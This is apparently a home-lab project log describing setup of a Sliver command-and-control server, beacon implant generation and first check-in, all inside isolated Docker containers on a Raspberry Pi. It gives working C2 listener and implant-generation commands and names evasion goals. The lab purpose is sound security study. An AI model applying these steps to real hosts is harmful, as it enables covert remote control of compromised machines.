# Offense: C2 Setup

## Overview

This document covers the setup of the Sliver C2 server, the first component of the offensive side of Operation GLASSHOUSE. The server runs as a Docker container, isolated on the `net-c2` network, with no direct access to the host's LAN or the internet.

## Why Sliver

Sliver was chosen because it is open-source, actively maintained by Bishop Fox, supports multiple transport protocols (mTLS, HTTP/HTTPS, DNS, WireGuard), and includes built-in support for malleable C2 profiles and beacon jitter — both of which are core to this project's evasion goals.

## Building the C2 Server Container

### Initial approach: pre-built Docker image

The first attempt used the official Docker image (`ghcr.io/bishopfox/sliver:latest`), but it returned a `denied` error from the registry, indicating the image is not publicly accessible under that path.

### Second approach: build from source inside the container

The next attempt installed Sliver via its official install script (`curl https://sliver.sh/install | bash`) inside a Debian-based Dockerfile. This triggered a full local build, which placed sustained high load on the Raspberry Pi 5's CPU. Combined with an underpowered power supply, this caused the board to lose power entirely mid-build, confirmed afterwards via:

    vcgencmd get_throttled
    throttled=0x50000

This value indicates both undervoltage and throttling had occurred since the last boot. The takeaway: any sustained heavy compilation task should be avoided without a proper 27W USB-C PD power supply for the Pi 5.

### Final approach: pre-compiled binary download

To avoid any local compilation, the Dockerfile was rewritten to simply download the pre-compiled `linux-arm64` server binary directly from Sliver's GitHub releases.

**`c2/Dockerfile`:**

    FROM debian:bookworm-slim

    RUN apt-get update && apt-get install -y \
        curl \
        ca-certificates \
        && rm -rf /var/lib/apt/lists/*

    RUN curl -L -o /usr/local/bin/sliver-server \
        https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux-arm64 \
        && chmod +x /usr/local/bin/sliver-server

    WORKDIR /root

    CMD ["sliver-server"]

This approach is both lighter on the CPU and avoids the power-related crash entirely.

### Debugging the binary name

The first attempt at this Dockerfile used an incorrect filename (`silver-server` instead of `sliver-server`), which caused the container to crash-loop with an `exec format error`. The correct asset name, confirmed directly from the GitHub releases page, is:

    sliver-server_linux-arm64

## Docker Compose Configuration

    networks:
      net-offense:
        driver: bridge
        internal: true
      net-c2:
        driver: bridge
        internal: true
      net-detection:
        driver: bridge

    volumes:
      sliver-data:

    services:
      sliver-c2:
        build:
          context: ./c2
        container_name: sliver-c2
        hostname: sliver-c2
        networks:
          - net-c2
        volumes:
          - sliver-data:/root/.sliver
        stdin_open: true
        tty: true
        restart: unless-stopped

The `net-c2` network is marked `internal: true`, meaning the container has no route to the internet or the host's LAN. It only communicates with other containers explicitly attached to the same network.

## Verifying the Setup

    docker compose up -d sliver-c2
    docker ps
    docker exec -it sliver-c2 sliver-server

On first run, the Sliver server generates its internal certificates and configuration, then drops into its interactive console:

    sliver >

## Creating the Listener

Inside the Sliver console, an HTTP listener was created to accept beacon connections:

    http -L 0.0.0.0 -l 8888

Note the flag convention in this version of Sliver: `-L` (uppercase) sets the listen host/interface, and `-l` (lowercase) sets the listen port — the opposite of what might be assumed from common CLI conventions.

Confirming the listener is active:

    jobs

    ID   Name   Protocol   Port
    1    http   tcp        8888

## Generating the Beacon Implant

With the listener active, the next step was generating a beacon implant to run inside a separate "target" container, simulating a compromised host.

### First attempt: incorrect C2 address

The first generated beacon pointed to `localhost:8888`:

    generate beacon --http localhost:8888 --os linux --arch arm64 --skip-symbols --save /root/

This failed silently. The beacon ran inside the target container but never checked in. The root cause: `localhost` inside a container refers to the container itself, not the `sliver-c2` container. In Docker, cross-container communication requires the service's hostname, not `localhost`.

### Corrected approach

The beacon was regenerated using the C2 container's Docker hostname instead:

    generate beacon --http sliver-c2:8888 --os linux --arch arm64 --skip-symbols --save /root/

### The `--skip-symbols` flag

An earlier attempt without this flag failed with a generic `rpc error: code = Internal desc = exit status 1`. Symbol obfuscation depends on additional tooling during the build process that isn't fully supported in this minimal container setup. Disabling it (`--skip-symbols` / `-l`) resolved the build failure, at the cost of not obfuscating the binary's internal symbols, an evasion trade-off to revisit later.

## Target Container

A second container was created to simulate a compromised host running the beacon implant.

**`target/Dockerfile`:**

    FROM debian:bookworm-slim

    RUN apt-get update && apt-get install -y ca-certificates && rm -rf /var/lib/apt/lists/*

    COPY beacon /opt/beacon
    RUN chmod +x /opt/beacon

    WORKDIR /opt
    CMD ["./beacon"]

**Compose service:**

    target:
      build:
        context: ./target
      container_name: target
      hostname: target
      networks:
        - net-c2
      restart: unless-stopped

The beacon binary is copied out of the `sliver-c2` container and into the `target` build context before each build:

    docker cp sliver-c2:/root/<generated-beacon-name> ~/operation-glasshouse/target/beacon
    chmod +x ~/operation-glasshouse/target/beacon
    docker compose build target
    docker compose up -d --force-recreate target

## First Successful Beacon Check-In

After correcting the C2 address, the beacon successfully checked in:

    [server] sliver > beacons

    ID         Name             Transport   Hostname   Username   Operating System   Last Check-In   Next
    d42d14eb   WELCOME_INSECT   http(s)     target     root       linux/arm64        7s              59s

This confirmed the full offensive chain was working end-to-end:

    Implant (target container) -> net-c2 -> HTTP listener (sliver-c2) -> Beacon session visible in console

## Interacting with the Beacon

    use d42d14eb
    whoami
    ls
    ifconfig

Since this is a beacon (not an interactive session), commands are queued and only executed/returned on the beacon's next check-in, a deliberate trade-off for stealth over real-time interactivity.

## Debugging Notes

- **Docker networking**: always use the service's hostname (as defined in `docker-compose.yml`), never `localhost`, when containers need to reach each other.
- **Beacon errors are often silent**: a misconfigured C2 address doesn't throw an error, the beacon simply never checks in. `docker logs <container>` on the target often shows nothing at all, since beacons are designed to be quiet. The absence of a beacon in `beacons` is the real signal to investigate.
- **Flag parsing**: Sliver's internal command parser doesn't support combined shorthand flags (e.g. `ls -la` fails; `ls -l` works).

## Status

- Sliver C2 server running in an isolated container.
- HTTP listener active on port 8888.
- Beacon implant generated and successfully checking in from a separate target container.

Next: configure beacon jitter and a malleable C2 profile, then introduce the redirector.
